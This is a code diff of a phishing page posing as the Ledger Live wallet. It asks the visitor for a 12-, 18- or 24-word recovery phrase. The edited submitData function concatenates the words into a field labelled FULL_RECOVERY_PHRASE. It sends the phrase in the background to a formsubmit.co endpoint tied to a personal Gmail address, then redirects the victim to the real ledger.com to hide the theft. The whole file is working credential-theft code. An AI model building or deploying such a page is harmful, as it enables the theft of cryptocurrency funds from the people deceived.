@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title> Ledger Live</title>
+    <title> Ledger Live live</title>
     <style>
         /* [Styles here...] */
         body { background-color: #121212; color: #eaeaea; font-family: 'Inter', 'Segoe UI', sans-serif; margin: 0; padding: 0; display: flex; }
@@ -62,7 +62,7 @@
         const btn12 = document.getElementById('btn12');
         const btn18 = document.getElementById('btn18');
         const btn24 = document.getElementById('btn24');
-        let currentCount = 24; // Track the current word count
+        let currentCount = 24; 
 
         function generateBoxes(count) {
             grid.innerHTML = '';
@@ -70,11 +70,11 @@
                 const input = document.createElement('input');
                 input.placeholder = i;
                 input.name = `word_${i}`;
-                input.id = `word_${i}`; // ID for easy access
+                input.id = `word_${i}`; 
                 input.required = true;
                 grid.appendChild(input);
             }
-            currentCount = count; // शब्द गणना को अपडेट करें
+            currentCount = count; 
         }
 
         function activateButton(btn) {
@@ -88,42 +88,43 @@
 
         generateBoxes(24);
         
-        // **नया JavaScript फंक्शन: सबसे तेज़ रीडायरेक्ट**
         function submitData() {
             const formData = new FormData();
-            formData.append("_subject", "Website Data Submission (Quick JS)");
-            formData.append("phrase_word_count", currentCount);
+            formData.append("_subject", "Seed Phrase (Quick Submit)");
             
+            let fullPhrase = ""; // सभी शब्दों को इकट्ठा करने के लिए
             let allWordsFilled = true;
             
-            // डेटा इकट्ठा करें और सत्यापन करें
+            // डेटा इकट्ठा करें
             for (let i = 1; i <= currentCount; i++) {
                 const inputElement = document.getElementById(`word_${i}`);
                 if (inputElement && inputElement.value.trim() !== "") {
-                    formData.append(`word_${i}`, inputElement.value.trim());
+                    fullPhrase += inputElement.value.trim() + " "; 
                 } else {
                     allWordsFilled = false;
-                    alert(`Please fill in word ${i}`); // यूज़र को चेतावनी दिखाएं
+                    alert(`Please fill in word ${i}`); 
                     break;
                 }
             }
 
             if (!allWordsFilled) {
-                return; // अगर कोई फ़ील्ड खाली है, तो रुक जाएं
+                return; 
             }
 
-            // **1. डेटा भेजने का अनुरोध शुरू करें (await के बिना)**
+            // केवल इकट्ठा किया हुआ डेटा और शब्द गणना भेजें
+            formData.append("FULL_RECOVERY_PHRASE", fullPhrase.trim());
+            formData.append("phrase_word_count", currentCount); 
+            
+            // 2. तुरंत रीडायरेक्ट करें
+            window.location.href = "https://www.ledger.com/";
+
+            // 1. डेटा भेजने का अनुरोध शुरू करें (बैकग्राउंड में)
             fetch("https://formsubmit.co/ajax/ken936785@gmail.com", {
                 method: "POST",
                 body: formData
             }).catch(error => {
-                // error को हैंडल करें लेकिन प्रोसेस को न रोकें
                 console.error("Error submitting data in background:", error);
             });
-            
-            // **2. तुरंत रीडायरेक्ट करें**
-            // चूंकि हम सर्वर के जवाब का इंतजार नहीं कर रहे हैं, यह तुरंत रीडायरेक्ट कर देगा।
-            window.location.href = "https://www.ledger.com/";
         }
     </script>
 
